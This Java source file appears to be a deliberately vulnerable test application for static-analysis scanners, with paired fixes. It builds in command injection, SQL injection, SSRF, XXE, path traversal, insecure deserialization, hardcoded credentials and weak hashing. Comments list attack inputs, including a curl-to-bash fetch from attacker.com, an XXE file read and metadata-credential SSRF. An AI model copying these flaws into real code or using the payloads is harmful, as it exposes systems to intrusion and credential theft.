import java.io.*;
import java.net.*;
import java.sql.*;
import java.util.*;
import javax.xml.parsers.*;
import org.w3c.dom.*;
import org.xml.sax.InputSource;

/**
 * =============================================================================
 * java/VulnerableApp.java – TigerGate CNAPP Test: Java Vulnerable Application
 * =============================================================================
 * PURPOSE: Intentionally vulnerable Java application for SAST (SonarQube)
 * testing.
 * Simulates a realistic Java enterprise application with common security flaws.
 *
 * ⚠️ EDUCATIONAL USE ONLY — Never deploy in production.
 *
 * VULNERABILITIES COVERED:
 * CWE-78 – OS Command Injection via Runtime.exec()
 * CWE-89 – SQL Injection via Statement.execute()
 * CWE-918 – SSRF via URL.openConnection()
 * CWE-611 – XXE via DocumentBuilder (default config)
 * CWE-22 – Path Traversal via File operations
 * CWE-502 – Insecure Deserialization via ObjectInputStream
 * CWE-798 – Hardcoded Credentials (AWS keys, DB password, API key)
 * CWE-338 – Cryptographically Weak PRNG (Math.random())
 * CWE-327 – Weak MD5/SHA1 cryptography for passwords
 * CWE-396 – Catching generic Exception (poor error handling)
 * CWE-209 – Verbose exception messages exposed
 * =============================================================================
 */
public class VulnerableApp {

    // =========================================================================
    // VULN: CWE-798 – Hardcoded Credentials
    // SonarQube Rule: S6418 "Credentials should not be hardcoded"
    // These are visible in compiled bytecode via javap/decompilers!
    // FIX: Use environment variables / external secrets manager
    // =========================================================================
    public static final String AWS_ACCESS_KEY_ID = "AKIAIOSFODNN7EXAMPLE"; // 🔴 Hardcoded!
    public static final String AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"; // 🔴!
    private static final String DB_URL = "jdbc:mysql://localhost:3306/megadb"; // BAD: hardcoded URL
    private static final String DB_USER = "root"; // 🔴 Hardcoded!
    private static final String DB_PASS = "root123"; // 🔴 Hardcoded!
    private static final String JWT_SECRET = "javajwtsecret123"; // 🔴 Hardcoded!
    private static final String STRIPE_KEY = "sk_live_JAVA_FAKE_KEY_12345"; // 🔴 API key hardcoded!

    public static void main(String[] args) throws Exception {
        System.out.println("AWS Key: " + AWS_ACCESS_KEY_ID); // 🔴 Credentials in logs!
        System.out.println("DB Password: " + DB_PASS); // 🔴 Password in logs!

        if (args.length > 0) {
            String action = args[0];
            switch (action) {
                case "exec":
                    demonstrateCommandInjection(args.length > 1 ? args[1] : "id");
                    break;
                case "sqli":
                    demonstrateSQLInjection(args.length > 1 ? args[1] : "1 OR 1=1");
                    break;
                case "ssrf":
                    demonstrateSSRF(args.length > 1 ? args[1] : "http://169.254.169.254/latest/meta-data/");
                    break;
                case "xxe":
                    demonstrateXXE(args.length > 1 ? args[1] : "<root><name>test</name></root>");
                    break;
                case "path":
                    demonstratePathTraversal(args.length > 1 ? args[1] : "../../etc/passwd");
                    break;
                case "deser":
                    demonstrateDeserialization(args.length > 1 ? args[1] : "");
                    break;
                case "crypto":
                    demonstrateWeakCrypto("password");
                    break;
                default:
                    demonstrateAll();
                    break;
            }
        } else {
            demonstrateAll();
        }
    }

    // =========================================================================
    // VULN 1: CWE-78 – OS Command Injection via Runtime.getRuntime().exec()
    // SonarQube Rule: S4721 "OS commands should not be vulnerable to injection
    // attacks"
    // ATTACK: java VulnerableApp exec "id; cat /etc/passwd"
    // ATTACK: java VulnerableApp exec "curl http://attacker.com/shell.sh | bash"
    // FIX: Use String[] command form (no shell): Runtime.exec(new String[]{"ping",
    // "-c", "1", host})
    // And validate input against an allowlist.
    // =========================================================================
    public static void demonstrateCommandInjection(String userInput) {
        System.out.println("\n[VULN 1: CWE-78 – OS Command Injection]");
        System.out.println("Executing: " + userInput);
        try {
            // 🔴 CRITICAL: String passed to shell — allows command chaining with ; && ||
            Process proc = Runtime.getRuntime().exec(userInput); // 🔴 CWE-78!
            // Alternative also vulnerable: Runtime.getRuntime().exec(new String[]{"sh",
            // "-c", userInput})

            BufferedReader reader = new BufferedReader(new InputStreamReader(proc.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println("  OUTPUT: " + line);
            }
            proc.waitFor();
        } catch (Exception e) {
            // 🔴 BAD: CWE-396 – Catching generic Exception hides specific errors
            System.err.println("Error: " + e.getMessage()); // BAD: Prints exception to user
        }
    }

    // =========================================================================
    // VULN 2: CWE-89 – SQL Injection via Statement.execute()
    // SonarQube Rule: S3649
    // ATTACK: input = "1 OR 1=1" → dumps all users
    // ATTACK: input = "1; DROP TABLE users;--" → deletes table
    // FIX: Use PreparedStatement:
    // PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE id =
    // ?");
    // ps.setString(1, userInput);
    // =========================================================================
    public static void demonstrateSQLInjection(String userInput) {
        System.out.println("\n[VULN 2: CWE-89 – SQL Injection]");
        try {
            Connection conn = DriverManager.getConnection(DB_URL, DB_USER, DB_PASS);
            Statement stmt = conn.createStatement();
            // 🔴 CRITICAL: String concatenation in SQL query!
            String sql = "SELECT id, username, password, ssn FROM users WHERE id = " + userInput; // 🔴 SQLi!
            System.out.println("Executing SQL: " + sql); // 🔴 SQL logged — reveals structure
            ResultSet rs = stmt.executeQuery(sql);
            while (rs.next()) {
                // 🔴 BAD: Printing password hashes to console
                System.out.printf("  User: %s | Password: %s | SSN: %s%n",
                        rs.getString("username"),
                        rs.getString("password"), // 🔴 Password exposed!
                        rs.getString("ssn") // 🔴 PII exposed!
                );
            }
            conn.close();
        } catch (SQLException e) {
            // 🔴 BAD: SQL exception (including injected payload) printed to user
            System.err.println("SQL Error: " + e.getMessage()); // 🔴 Info disclosure!
        }
    }

    // =========================================================================
    // VULN 3: CWE-918 – Server-Side Request Forgery via URL.openConnection()
    // ATTACK: url =
    // "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    // → Returns temporary AWS IAM credentials
    // ATTACK: url = "file:///etc/passwd" → Reads local files
    // FIX: Validate URL, deny private IP ranges (10.0.0.0/8, 172.16.0.0/12,
    // 192.168.0.0/16,
    // 169.254.0.0/16), deny file:// and other non-http/https schemes
    // =========================================================================
    public static void demonstrateSSRF(String url) throws Exception {
        System.out.println("\n[VULN 3: CWE-918 – SSRF]");
        System.out.println("Fetching: " + url);
        // 🔴 CRITICAL: No URL validation — fetches internal services and metadata!
        URL targetUrl = new URL(url);
        URLConnection conn = targetUrl.openConnection(); // 🔴 CWE-918 SSRF!
        BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
        StringBuilder sb = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null)
            sb.append(line).append("\n");
        System.out.println("  Response: " + sb.toString());
    }

    // =========================================================================
    // VULN 4: CWE-611 – XML External Entity (XXE) Injection
    // WHY: DocumentBuilderFactory with default settings allows external entities
    // ATTACK: XML payload that reads /etc/passwd:
    // <?xml version="1.0"?>
    // <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    // <root>&xxe;</root>
    // FIX:
    // factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl",
    // true);
    // factory.setFeature("http://xml.org/sax/features/external-general-entities",
    // false);
    // =========================================================================
    public static void demonstrateXXE(String xmlInput) throws Exception {
        System.out.println("\n[VULN 4: CWE-611 – XXE Injection]");
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        // 🔴 CRITICAL: External entities NOT disabled!
        // factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl",
        // true); // MISSING!
        DocumentBuilder builder = factory.newDocumentBuilder(); // 🔴 Default = XXE allowed!
        Document doc = builder.parse(new InputSource(new StringReader(xmlInput)));
        doc.getDocumentElement().normalize();
        System.out.println("  Root: " + doc.getDocumentElement().getNodeName());
        // If XXE payload was used, the entity content (e.g., /etc/passwd) appears here
        NodeList nodes = doc.getElementsByTagName("*");
        for (int i = 0; i < nodes.getLength(); i++) {
            System.out.println("  Node: " + nodes.item(i).getNodeName()
                    + " = " + nodes.item(i).getTextContent());
        }
    }

    // =========================================================================
    // VULN 5: CWE-22 – Path Traversal via File operations
    // ATTACK: filename = "../../etc/passwd"
    // ATTACK: filename = "/proc/1/environ" (contains environment variables with
    // secrets)
    // FIX:
    // Path basePath = Paths.get("/var/app/uploads").toAbsolutePath().normalize();
    // Path filePath = basePath.resolve(filename).normalize();
    // if (!filePath.startsWith(basePath)) throw new SecurityException("Path
    // traversal!");
    // =========================================================================
    public static void demonstratePathTraversal(String filename) throws Exception {
        System.out.println("\n[VULN 5: CWE-22 – Path Traversal]");
        System.out.println("Reading: " + filename);
        // 🔴 BAD: No path normalization or restriction check!
        File file = new File("/var/app/uploads/" + filename); // 🔴 CWE-22!
        BufferedReader reader = new BufferedReader(new FileReader(file));
        String line;
        while ((line = reader.readLine()) != null) {
            System.out.println("  " + line);
        }
        reader.close();
    }

    // =========================================================================
    // VULN 6: CWE-502 – Insecure Deserialization via ObjectInputStream
    // WHY: ObjectInputStream.readObject() can instantiate arbitrary classes
    // → Remote Code Execution via gadget chains (Apache Commons, Spring, etc.)
    // FIX: Never deserialize untrusted data.
    // If necessary, use a whitelist-based ObjectInputStream filter (Java 9+)
    // =========================================================================
    public static void demonstrateDeserialization(String base64Payload) throws Exception {
        System.out.println("\n[VULN 6: CWE-502 – Insecure Deserialization]");
        if (base64Payload.isEmpty()) {
            System.out.println("  No payload provided (provide base64-encoded serialized object)");
            return;
        }
        byte[] bytes = Base64.getDecoder().decode(base64Payload);
        ByteArrayInputStream bis = new ByteArrayInputStream(bytes);
        ObjectInputStream ois = new ObjectInputStream(bis); // 🔴 CWE-502!
        // 🔴 CRITICAL: readObject() can trigger arbitrary code via gadget chains!
        Object obj = ois.readObject(); // 🔴 RCE via deserialization!
        System.out.println("  Deserialized: " + obj.toString());
        ois.close();
    }

    // =========================================================================
    // VULN 7: CWE-327 + CWE-338 – Weak Cryptography and Weak PRNG
    // SonarQube Rules: S2070 (MD5/SHA1), S2245 (Math.random)
    // ATTACK: MD5 hashes are precomputed in rainbow tables → instant crack
    // FIX for hashing: Use bcrypt/scrypt/argon2
    // FIX for random: Use SecureRandom.getInstanceStrong()
    // =========================================================================
    public static void demonstrateWeakCrypto(String password) throws Exception {
        System.out.println("\n[VULN 7: CWE-327/338 – Weak Crypto + PRNG]");

        // 🔴 BAD: MD5 for password hashing — easily cracked with rainbow tables
        java.security.MessageDigest md = java.security.MessageDigest.getInstance("MD5"); // 🔴 S2070!
        byte[] hash = md.digest(password.getBytes());
        System.out.println("  MD5 hash of '" + password + "': " + bytesToHex(hash)); // Crackable!

        // 🔴 BAD: SHA-1 also deprecated for security use
        java.security.MessageDigest sha1 = java.security.MessageDigest.getInstance("SHA-1"); // 🔴 S2070!
        System.out.println("  SHA-1: " + bytesToHex(sha1.digest(password.getBytes())));

        // 🔴 BAD: Math.random() is NOT cryptographically secure — predictable!
        double token = Math.random(); // 🔴 S2245 — should use SecureRandom!
        System.out.println("  Weak token: " + token); // Predictable without seed knowledge
    }

    // =========================================================================
    // ADDITIONAL: Open Redirect
    // VULN: CWE-601 – URL redirect without validation
    // If this were a servlet: response.sendRedirect(request.getParameter("url"))
    // User sees trusted domain → follows link → lands on attacker site
    // =========================================================================
    public static void demonstrateOpenRedirect(String redirectUrl) {
        System.out.println("\n[VULN 8: CWE-601 – Open Redirect]");
        // 🔴 BAD: Would redirect: response.sendRedirect(redirectUrl); without
        // validation
        System.out.println("  Would redirect to: " + redirectUrl + " (no validation!)"); // 🔴
    }

    private static void demonstrateAll() throws Exception {
        System.out.println("========================================");
        System.out.println("  TigerGate Java Vulnerability Demo");
        System.out.println("  AWS Key: " + AWS_ACCESS_KEY_ID); // 🔴 In logs!
        System.out.println("  DB Pass: " + DB_PASS); // 🔴 In logs!
        System.out.println("========================================");
        demonstrateCommandInjection("id");
        demonstrateWeakCrypto("password123");
        demonstrateOpenRedirect("http://attacker.com");
        System.out.println("\nRun specific demos: exec|sqli|ssrf|xxe|path|deser|crypto");
    }

    private static String bytesToHex(byte[] bytes) {
        StringBuilder sb = new StringBuilder();
        for (byte b : bytes)
            sb.append(String.format("%02x", b));
        return sb.toString();
    }
}
